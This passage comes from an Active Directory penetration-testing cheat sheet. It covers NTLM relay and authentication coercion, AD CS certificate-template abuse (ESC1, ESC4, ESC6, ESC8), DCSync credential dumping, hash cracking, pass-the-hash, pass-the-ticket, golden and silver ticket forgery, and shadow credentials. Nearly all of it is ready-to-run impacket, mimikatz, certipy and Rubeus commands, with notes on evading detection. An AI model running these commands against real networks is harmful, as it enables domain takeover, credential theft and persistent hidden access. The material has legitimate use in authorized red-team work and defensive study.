impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Relay with SOCKS proxy
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Relay and dump SAM
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Relay to LDAP (add computer account)
impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access
```

#### Coerce Authentication

```bash
# PetitPotam (MS-EFSRPC)
python3 PetitPotam.py <LHOST> <RHOST>
python3 PetitPotam.py -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> <LHOST> <RHOST>

# PrinterBug/SpoolSample (MS-RPRN)
python3 printerbug.py <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>@<RHOST> <LHOST>

# Coercer (multiple methods)
python3 Coercer.py -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> -d <DOMAIN> -l <LHOST> -t <RHOST>

# DFSCoerce
python3 dfscoerce.py -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> -d <DOMAIN> <LHOST> <RHOST>
```

### 4.4 AD CS (Certificate Services) Abuse

**Prerequisites:**
- Domain user credentials
- AD CS deployed in environment
- Certipy or Certify for enumeration and exploitation

**Concept:** Active Directory Certificate Services (AD CS) provides Public Key Infrastructure (PKI) functionality. Misconfigurations in certificate templates or CA settings can be exploited for privilege escalation and persistence.

#### Enumerate AD CS - Linux

```bash
# Certipy - find all templates and CAs
certipy find -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -dc-ip <DC_IP>

# Find vulnerable templates only
certipy find -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -dc-ip <DC_IP> -vulnerable -stdout
```

#### Enumerate AD CS - Windows

```powershell
# Certify - find all
.\Certify.exe find

# Find vulnerable templates
.\Certify.exe find /vulnerable

# List CAs
.\Certify.exe cas
```

#### ESC1 - Misconfigured Certificate Templates

**Conditions:**
- Template allows Client Authentication EKU
- ENROLLEE_SUPPLIES_SUBJECT flag enabled (can specify SAN)
- Low-privileged users can enroll

```bash
# Request certificate as another user (e.g., Administrator)
certipy req -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -ca <CA_NAME> -target <CA_SERVER> -template <VULNERABLE_TEMPLATE> -upn Administrator@<DOMAIN>

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

```powershell
# Certify - request certificate with alternate name
.\Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<VULNERABLE_TEMPLATE> /altname:Administrator

# Rubeus - request TGT using certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

#### ESC4 - Vulnerable Certificate Template ACL

**Conditions:**
- Low-privileged user has write access to template object
- Can modify template to enable ESC1 conditions

```bash
# Save original template configuration
certipy template -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -template <TEMPLATE_NAME> -save-old

# Modify template to enable ESC1
certipy template -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -template <TEMPLATE_NAME> -configuration ESC1

# Exploit as ESC1
certipy req -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -ca <CA_NAME> -target <CA_SERVER> -template <TEMPLATE_NAME> -upn Administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# Restore original template
certipy template -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -template <TEMPLATE_NAME> -configuration <TEMPLATE_NAME>.json
```

#### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Conditions:**
- CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
- Allows specifying SAN in any certificate request

```bash
# Request certificate with SAN for any template
certipy req -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -ca <CA_NAME> -target <CA_SERVER> -template User -upn Administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

#### ESC8 - NTLM Relay to AD CS HTTP Endpoint

**Conditions:**
- CA has HTTP enrollment endpoint enabled
- NTLM authentication enabled on endpoint

```bash
# Step 1: Start relay targeting CA web enrollment
impacket-ntlmrelayx -t http://<CA_SERVER>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce authentication from DC
python3 PetitPotam.py <LHOST> <DC_IP>

# Step 3: Use the certificate
certipy auth -pfx <DC>$.pfx -dc-ip <DC_IP>

# Will get DC machine account hash - use for DCSync
impacket-secretsdump <DOMAIN>/'<DC>$'@<DC_IP> -hashes :<NTLM_HASH>
```

---

## 5 Domain Dominance Phase (High-Privilege Access)

### 5.1 DCSync

**Prerequisites:**
- Account with DCSync rights:
  - Domain Admins, Enterprise Admins, Administrators
  - Or explicit: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All

**Concept:** DCSync is a technique that simulates the behavior of a Domain Controller using the Directory Replication Service Remote Protocol (MS-DRSR). It allows an attacker to request password data for any user from a Domain Controller, effectively dumping all domain credentials.

#### Check DCSync Rights

```powershell
# PowerView
Get-ObjectAcl -DistinguishedName "dc=<DOMAIN>,dc=local" -ResolveGUIDs | Where-Object {
    ($_.ObjectType -match 'replication-get') -or 
    ($_.ActiveDirectoryRights -match 'GenericAll')
} | select IdentityReference
```

#### Perform DCSync - Windows

```powershell
# Mimikatz - single user
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator

# Mimikatz - all users
mimikatz # lsadump::dcsync /domain:<DOMAIN> /all /csv
```

#### Perform DCSync - Linux

```bash
# Impacket secretsdump - all hashes
impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>@<DC_IP>
impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>@<DC_IP> -just-dc

# NTDS only (no SAM/LSA)
impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>@<DC_IP> -just-dc-ntlm

# Single user
impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>@<DC_IP> -just-dc-user krbtgt
impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>@<DC_IP> -just-dc-user Administrator

# With hash
impacket-secretsdump <DOMAIN>/<DOMAIN_USER>@<DC_IP> -hashes :<NTLM_HASH> -just-dc

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/<DOMAIN_USER>@<DC_FQDN>

# NetExec
netexec smb <DC_IP> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --ntds
netexec smb <DC_IP> -u <DOMAIN_USER> -H <NTLM_HASH> --ntds
```

#### Crack NTLM Hashes

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 5.2 Pass-the-Hash (PtH)

**Prerequisites:**
- NTLM hash of target user
- SMB/WinRM access to target
- Local admin rights on target (for most techniques)

**Concept:** Pass-the-Hash (PtH) allows an attacker to authenticate to a remote system using the NTLM hash of a user's password, without needing to know or crack the actual plaintext password.

#### Linux Tools

```bash
# Impacket psexec (gets SYSTEM shell)
impacket-psexec <DOMAIN>/<DOMAIN_USER>@<RHOST> -hashes :<NTLM_HASH>

# Impacket wmiexec
impacket-wmiexec <DOMAIN>/<DOMAIN_USER>@<RHOST> -hashes :<NTLM_HASH>

# Impacket smbexec
impacket-smbexec <DOMAIN>/<DOMAIN_USER>@<RHOST> -hashes :<NTLM_HASH>

# Evil-WinRM (requires WinRM enabled - port 5985)
evil-winrm -i <RHOST> -u <USER> -H <NTLM_HASH>

# NetExec/CrackMapExec
netexec smb <RHOST> -u <USER> -H <NTLM_HASH> -x "whoami"
netexec winrm <RHOST> -u <USER> -H <NTLM_HASH> -x "whoami"
crackmapexec smb <RHOST> -u <USER> -H <NTLM_HASH> --sam
crackmapexec smb <RHOST> -u <USER> -H <NTLM_HASH> --lsa

# xfreerdp (RDP PtH - requires Restricted Admin mode)
xfreerdp /u:<USER> /pth:<NTLM_HASH> /d:<DOMAIN> /v:<RHOST>
```

#### Windows Tools

```powershell
# Mimikatz sekurlsa::pth
mimikatz # sekurlsa::pth /user:<DOMAIN_USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe

# Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <RHOST> -Domain <DOMAIN> -Username <DOMAIN_USER> -Hash <NTLM_HASH> -Command "whoami"
Invoke-WMIExec -Target <RHOST> -Domain <DOMAIN> -Username <DOMAIN_USER> -Hash <NTLM_HASH> -Command "whoami"
```

### 5.3 Pass-the-Ticket & Overpass-the-Hash

**Prerequisites:**
- Valid Kerberos ticket (.kirbi or .ccache) OR NTLM hash
- Network connectivity to target

**Concept:** Pass-the-Ticket involves using stolen Kerberos tickets (TGT or TGS) to authenticate. Overpass-the-Hash converts an NTLM hash into a Kerberos ticket (TGT), allowing authentication using Kerberos instead of NTLM.

#### Overpass-the-Hash (Request TGT with hash)

```powershell
# Rubeus - request TGT and inject
.\Rubeus.exe asktgt /user:<DOMAIN_USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt

# Rubeus - with AES key (more stealthy)
.\Rubeus.exe asktgt /user:<DOMAIN_USER> /domain:<DOMAIN> /aes256:<AES_KEY> /ptt

# Mimikatz
mimikatz # sekurlsa::pth /user:<DOMAIN_USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell.exe
```

```bash
# Linux - Impacket getTGT
impacket-getTGT <DOMAIN>/<DOMAIN_USER> -hashes :<NTLM_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=<DOMAIN_USER>.ccache

# Use with other tools
impacket-psexec <DOMAIN>/<DOMAIN_USER>@<TARGET> -k -no-pass
impacket-wmiexec <DOMAIN>/<DOMAIN_USER>@<TARGET> -k -no-pass
```

#### Pass-the-Ticket

```powershell
# Export tickets from memory (requires admin)
mimikatz # sekurlsa::tickets /export

# Rubeus dump
.\Rubeus.exe dump

# Inject ticket
mimikatz # kerberos::ptt <TICKET>.kirbi
.\Rubeus.exe ptt /ticket:<TICKET>.kirbi

# Verify
klist
```

```bash
# Linux - convert ticket format
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi

# Use ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec <DOMAIN>/<DOMAIN_USER>@<TARGET> -k -no-pass
```

---

## 6 Persistence & Evasion

### 6.1 Golden Ticket

**Prerequisites:**
- `krbtgt` NTLM hash (obtained via DCSync)
- Domain SID
- Domain Name

**Concept:** A Golden Ticket is a forged **Ticket Granting Ticket (TGT)**. Because the TGT is the root of trust in Kerberos, creating a fake one allows an attacker to generate TGS tickets for *any* service in the domain with *any* privileges.

* **Mechanism:** The attacker manually constructs a TGT and signs it using the captured `krbtgt` NTLM hash.
* **Persistence:** Valid until the `krbtgt` password is changed twice (which is rarely done).

#### Get Required Information

```powershell
# Get Domain SID
whoami /user
# SID format: S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX (remove the RID at the end)

# PowerView
Get-DomainSID

# Get krbtgt hash (requires DCSync rights)
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

```bash
# Linux - get SID
impacket-lookupsid <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>@<DC_IP>

# Get krbtgt hash
impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>@<DC_IP> -just-dc-user krbtgt
```

#### Golden Ticket - Windows

```powershell
# Mimikatz - create and inject
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX /krbtgt:<KRBTGT_NTLM_HASH> /ptt

# With AES key (more stealthy - avoids RC4 detection)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /aes256:<AES256_KEY> /ptt

# Create ticket file without injection
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /krbtgt:<HASH> /ticket:golden.kirbi

# Rubeus
.\Rubeus.exe golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /ptt
```

#### Golden Ticket - Linux

```bash
# Impacket ticketer
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX -domain <DOMAIN> Administrator

# With AES key
impacket-ticketer -aesKey <AES256_KEY> -domain-sid S-1-5-21-... -domain <DOMAIN> Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<DC_FQDN> -k -no-pass
impacket-wmiexec <DOMAIN>/Administrator@<DC_FQDN> -k -no-pass
impacket-secretsdump <DOMAIN>/Administrator@<DC_FQDN> -k -no-pass
```

### 6.2 Silver Ticket

**Prerequisites:**
- Service Account NTLM hash
- Domain SID
- Target SPN (Service Principal Name, e.g., `cifs/file01.corp.local`)

**Concept:** A Silver Ticket is a forged **Ticket Granting Service (TGS)** ticket. It bypasses the KDC entirely by creating a service ticket that can be presented directly to a target service.

* **Mechanism:** The attacker manually constructs a Service Ticket for a specific service and signs it using that service account's NTLM hash.
* **Stealth:** Because the DC is not involved, there is no TGS-REQ/TGS-REP traffic logged on the DC, making detection significantly harder.
* **Scope:** Limited to the specific service targeted.

#### Silver Ticket - Windows

```powershell
# Mimikatz - for CIFS service (file shares)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<TARGET_FQDN> /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /ptt

# For HTTP service (web apps)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<TARGET_FQDN> /service:http /rc4:<SERVICE_ACCOUNT_HASH> /ptt

# For HOST service (PsExec, scheduled tasks)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<TARGET_FQDN> /service:host /rc4:<SERVICE_ACCOUNT_HASH> /ptt

# For LDAP service (DCSync without DA)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<DC_FQDN> /service:ldap /rc4:<DC_MACHINE_HASH> /ptt
```

#### Silver Ticket - Linux

```bash
# Impacket ticketer for CIFS
impacket-ticketer -nthash <SERVICE_ACCOUNT_HASH> -domain-sid S-1-5-21-... -domain <DOMAIN> -spn cifs/<TARGET_FQDN> Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient <DOMAIN>/Administrator@<TARGET_FQDN> -k -no-pass
```

#### Common Service SPNs for Silver Tickets

```
cifs      - File shares (SMB)
http      - Web applications
host      - PsExec, WMI, scheduled tasks
ldap      - LDAP operations, DCSync
mssql     - SQL Server
wsman     - WinRM/PowerShell remoting
termsrv   - RDP
```

#### Golden vs. Silver Ticket Comparison

| Feature | Golden Ticket | Silver Ticket |
| :--- | :--- | :--- |
| **Ticket Type** | **TGT** (Ticket Granting Ticket) | **TGS** (Ticket Granting Service) |
| **Scope** | **Entire Domain** (Any Service, Any Server) | **Specific Service** only |
| **Key Required** | `krbtgt` account hash | Service Account hash |
| **Communicates with DC?** | **Yes** (Must request TGS from DC) | **No** (Directly contacts target server) |
| **Detection Noise** | Higher (Generates logs on DC) | Lower (No logs on DC; only on target) |
| **Persistence Risk** | High (Requires `krbtgt` password reset) | Moderate (Requires Service Account password reset) |

### 6.3 Shadow Credentials

**Prerequisites:**
- Write access to `msDS-KeyCredentialLink` attribute on target
- AD CS or Azure AD configured for certificate authentication

**Concept:** Shadow Credentials is a technique that abuses the Key Trust model for Kerberos Pre-Authentication. By adding a "fake" certificate to a user's `msDS-KeyCredentialLink` attribute, an attacker can authenticate as that user.

#### Linux - Certipy

```bash
# Certipy - automatic
certipy shadow auto -u <DOMAIN_USER>@<DOMAIN> -p <DOMAIN_USER_PWD> -account <TARGET_USER>

# Using pywhisker
python3 pywhisker.py -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --target <TARGET_USER> --action add --dc-ip <DC_IP>
```

#### Windows - Whisker

```powershell
# Whisker - add shadow credential
.\Whisker.exe
add /target:<TARGET_USER>
# Follow the Rubeus command in output

# List shadow credentials
.\Whisker.exe list /target:<TARGET_USER>

# Remove shadow credentials
.\Whisker.exe remove /target:<TARGET_USER> /deviceid:<DEVICE_ID>
```

